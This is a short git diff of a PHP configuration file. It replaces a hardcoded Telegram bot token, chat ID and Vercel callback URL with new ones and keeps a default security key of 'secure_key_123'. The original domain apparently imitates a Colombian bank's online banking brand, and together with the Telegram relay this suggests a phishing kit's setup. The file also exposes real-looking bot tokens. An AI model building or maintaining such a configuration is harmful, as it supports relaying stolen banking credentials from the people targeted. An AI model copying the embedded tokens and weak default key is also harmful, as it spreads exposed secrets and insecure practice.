@@ -52,14 +52,14 @@ $db_name = trim((string)$db_name, "'\" ");
 $db_port = trim((string)$db_port, "'\" ");
 
 return [
-    'botToken'     => trim((string)(getenv('BOT_TOKEN') ?: '8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo'), "'\" "),
-    'chatId'       => trim((string)(getenv('CHAT_ID') ?: '-5180034812'), "'\" "),
+    'botToken'     => trim((string)(getenv('BOT_TOKEN') ?: '8772319496:AAEDNgO_Xhy-SPIMEA7g5u59oI0UlJVKbiQ'), "'\" "),
+    'chatId'       => trim((string)(getenv('CHAT_ID') ?: '-5596275936'), "'\" "),
     'db_host'      => $db_host,
     'db_user'      => $db_user,
     'db_pass'      => $db_pass,
     'db_name'      => $db_name,
     'db_port'      => $db_port,
-    'baseUrl'      => trim((string)(getenv('BASE_URL') ?: 'https://solucionesvirtualesbancol.vercel.app/updatetele.php'), "'\" "),
+    'baseUrl'      => trim((string)(getenv('BASE_URL') ?: 'https://tricoprueba2.vercel.app/updatetele.php'), "'\" "),
     'security_key' => trim((string)(getenv('SECURITY_KEY') ?: 'secure_key_123'), "'\" ")
 ];
 ?>
